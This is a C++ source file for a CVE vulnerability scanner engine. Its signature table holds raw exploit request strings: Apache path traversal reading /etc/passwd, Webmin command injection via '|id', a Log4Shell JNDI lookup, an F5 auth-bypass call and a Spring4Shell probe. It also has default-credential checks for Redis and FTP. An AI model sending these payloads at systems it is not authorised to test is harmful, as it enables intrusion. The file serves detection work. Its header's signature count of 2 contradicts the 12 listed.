// ============================================================
// vuln_probe.cpp -- CVE 特征匹配漏洞探针引擎实现
//
// 包含：
//   1. 静态 CVE 签名库 cve_signatures_（2 条）
//   2. probe_cve / probe_heartbleed / probe_default_credentials 实现
// ============================================================

#include "vuln_probe.hpp"
#include <stdint.h>

extern "C" {
#include "net_client.hpp"
#include "lwip/inet.h"
}

// ---- 系统全局符号 ----
extern void sys_yield();

// ============================================================
// 内置 CVE 签名数据库（12 条）
// ============================================================
const CveSignature VulnProbe::cve_signatures_[VulnProbe::cve_count_] = {
    {"CVE-2014-0160", "openssl", "1.0.1", "\x18\x03\x02\x00\x03\x01\x40\x00", 8, "heartbeat", Severity::Critical,
     "Heartbleed - OpenSSL TLS heartbeat read overrun", 443},
    {"CVE-2017-7494", "samba", "3.5.0", nullptr, 0, "samba", Severity::Critical,
     "SambaCry - Remote code execution via shared library upload", 445},
    {"CVE-2019-0708", "rdp", "windows", nullptr, 0, "rdp", Severity::Critical,
     "BlueKeep - Windows RDP remote code execution", 3389},
    {"CVE-2021-41773", "apache", "2.4.49",
     "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.0\r\nHost: localhost\r\n\r\n", 68, "root:", Severity::High,
     "Apache HTTP Server path traversal and file disclosure", 80},
    {"CVE-2021-44228", "log4j", "2.0", "GET / HTTP/1.0\r\nUser-Agent: ${jndi:ldap://probe}\r\nHost: localhost\r\n\r\n",
     67, "log4j", Severity::Critical, "Log4Shell - Apache Log4j2 JNDI remote code execution", 8080},
    {"CVE-2022-22965", "spring", "5.3.0",
     "GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.0\r\nHost: "
     "localhost\r\n\r\n",
     89, "spring", Severity::Critical, "Spring4Shell - Spring Framework RCE via data binding", 8080},
    {"CVE-2023-44487", "http", "*", nullptr, 0, "rst_stream", Severity::High, "HTTP/2 Rapid Reset denial of service",
     443},
    {"CVE-2018-15473", "openssh", "7.7", nullptr, 0, "openssh", Severity::Medium,
     "OpenSSH user enumeration via malformed auth request", 22},
    {"CVE-2019-15107", "webmin", "1.8",
     "POST /password_change.cgi HTTP/1.0\r\nHost: localhost\r\nReferer: localhost\r\nContent-Length: "
     "48\r\n\r\nuser=root&pam=&expired=2&old=test|id&new1=new&new2=new",
     141, "uid=", Severity::Critical, "Webmin remote command injection via password change", 10000},
    {"CVE-2022-1388", "f5", "big-ip",
     "POST /mgmt/tm/util/bash HTTP/1.0\r\nHost: localhost\r\nX-F5-Auth-Token: bypass\r\nConnection: keep-alive\r\n\r\n",
     98, "commandResult", Severity::Critical, "F5 BIG-IP iControl REST authentication bypass", 443},
    {"CVE-2021-21972", "vmware", "vcenter", nullptr, 0, "vmware", Severity::Critical,
     "VMware vCenter Server unauthenticated file upload RCE", 443},
    {"CVE-2023-34362", "progress", "moveit", nullptr, 0, "moveit", Severity::Critical,
     "MOVEit Transfer SQL injection leading to RCE", 443},
};

// ============================================================
// 工具函数
// ============================================================

void VulnProbe::yield_cpu_() {
    sys_yield();
}

// ============================================================
// 单个 CVE 检测
// ============================================================

VulnResult VulnProbe::probe_cve(uint32_t ip, uint16_t port, const CveSignature& sig) {
    VulnResult result{};
    copy_str_(result.cve_id, sig.cve_id, sizeof(result.cve_id));
    copy_str_(result.description, sig.description, sizeof(result.description));
    result.severity = sig.severity;
    result.ip = ip;
    result.port = port;
    result.vulnerable = false;

    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = ip;

    int sock = auroraos::net::net_socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        return result;

    int rcv_timeout = static_cast<int>(timeout_ms_);
    auroraos::net::net_setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcv_timeout, sizeof(rcv_timeout));

    int flags = auroraos::net::net_fcntl(sock, F_GETFL, 0);
    auroraos::net::net_fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    err_t conn_err = auroraos::net::net_connect(sock, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr));
    if (conn_err != ERR_OK && conn_err != ERR_INPROGRESS && conn_err != ERR_WOULDBLOCK) {
        auroraos::net::net_close(sock);
        return result;
    }

    if (conn_err != ERR_OK) {
        struct timeval tv{};
        tv.tv_sec = timeout_ms_ / 1000;
        tv.tv_usec = static_cast<int>((timeout_ms_ % 1000) * 1000);
        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(sock, &wfds);
        if (auroraos::net::net_select(sock + 1, nullptr, &wfds, nullptr, &tv) <= 0) {
            auroraos::net::net_close(sock);
            return result;
        }
        int error = 0;
        socklen_t len = sizeof(error);
        auroraos::net::net_getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len);
        if (error != 0) {
            auroraos::net::net_close(sock);
            return result;
        }
    }

    if (sig.probe_payload && sig.probe_len > 0) {
        auroraos::net::net_send(sock, sig.probe_payload, sig.probe_len, 0);
    }

    char buf[1024];
    struct timeval tv{};
    tv.tv_sec = timeout_ms_ / 1000;
    tv.tv_usec = static_cast<int>((timeout_ms_ % 1000) * 1000);
    fd_set rfds;
    FD_ZERO(&rfds);
    FD_SET(sock, &rfds);

    if (auroraos::net::net_select(sock + 1, &rfds, nullptr, nullptr, &tv) > 0) {
        int n = auroraos::net::net_recv(sock, buf, sizeof(buf) - 1, 0);
        if (n > 0) {
            buf[n] = '\0';

            int ev_len =
                (n < static_cast<int>(sizeof(result.evidence) - 1)) ? n : static_cast<int>(sizeof(result.evidence) - 1);
            for (int i = 0; i < ev_len; ++i) {
                result.evidence[i] = buf[i];
            }
            result.evidence[ev_len] = '\0';

            if (sig.match_pattern && sig.match_pattern[0] != '\0') {
                result.vulnerable = match_pattern_(buf, sig.match_pattern);
            } else {
                result.vulnerable = true;
            }
        }
    }

    auroraos::net::net_close(sock);
    return result;
}

// ============================================================
// Heartbleed 快速检测
// ============================================================

VulnResult VulnProbe::probe_heartbleed(uint32_t ip, uint16_t port) {
    for (int i = 0; i < cve_count_; ++i) {
        if (match_pattern_(cve_signatures_[i].cve_id, "cve-2014-0160")) {
            return probe_cve(ip, port, cve_signatures_[i]);
        }
    }
    VulnResult empty{};
    empty.ip = ip;
    empty.port = port;
    return empty;
}

// ============================================================
// 默认凭证检测（Redis 无密码 + FTP anonymous）
// ============================================================

VulnResult VulnProbe::probe_default_credentials(uint32_t ip, uint16_t port, const char* service_name) {
    VulnResult result{};
    result.ip = ip;
    result.port = port;
    result.severity = Severity::High;
    result.vulnerable = false;
    copy_str_(result.cve_id, "WEAK-CREDS", sizeof(result.cve_id));
    copy_str_(result.description, "Default/weak credential check", sizeof(result.description));

    if (!service_name)
        return result;

    // Redis 无密码检测
    if (match_pattern_(service_name, "redis")) {
        struct sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = ip;

        int sock = auroraos::net::net_socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
            return result;

        int rcv_timeout = static_cast<int>(timeout_ms_);
        auroraos::net::net_setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcv_timeout, sizeof(rcv_timeout));

        if (auroraos::net::net_connect(sock, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) == ERR_OK) {
            const char* ping = "*1\r\n$4\r\nPING\r\n";
            int plen = 0;
            while (ping[plen])
                ++plen;
            auroraos::net::net_send(sock, ping, plen, 0);

            char buf[128];
            int n = auroraos::net::net_recv(sock, buf, sizeof(buf) - 1, 0);
            if (n > 0 && buf[0] == '+') {
                result.vulnerable = true;
                copy_str_(result.evidence, "Redis responded to PING without authentication", sizeof(result.evidence));
            }
        }
        auroraos::net::net_close(sock);
    }

    // FTP anonymous 检测
    if (match_pattern_(service_name, "ftp")) {
        struct sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = ip;

        int sock = auroraos::net::net_socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
            return result;

        int rcv_timeout = static_cast<int>(timeout_ms_);
        auroraos::net::net_setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcv_timeout, sizeof(rcv_timeout));

        if (auroraos::net::net_connect(sock, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) == ERR_OK) {
            char buf[256];
            auroraos::net::net_recv(sock, buf, sizeof(buf) - 1, 0);

            const char* user_cmd = "USER anonymous\r\n";
            int ulen = 0;
            while (user_cmd[ulen])
                ++ulen;
            auroraos::net::net_send(sock, user_cmd, ulen, 0);
            int n = auroraos::net::net_recv(sock, buf, sizeof(buf) - 1, 0);
            if (n > 0 && buf[0] == '3') {
                const char* pass_cmd = "PASS anonymous\r\n";
                int plen = 0;
                while (pass_cmd[plen])
                    ++plen;
                auroraos::net::net_send(sock, pass_cmd, plen, 0);
                n = auroraos::net::net_recv(sock, buf, sizeof(buf) - 1, 0);
                if (n > 0 && buf[0] == '2') {
                    result.vulnerable = true;
                    copy_str_(result.evidence, "FTP anonymous login accepted", sizeof(result.evidence));
                }
            }
        }
        auroraos::net::net_close(sock);
    }

    return result;
}
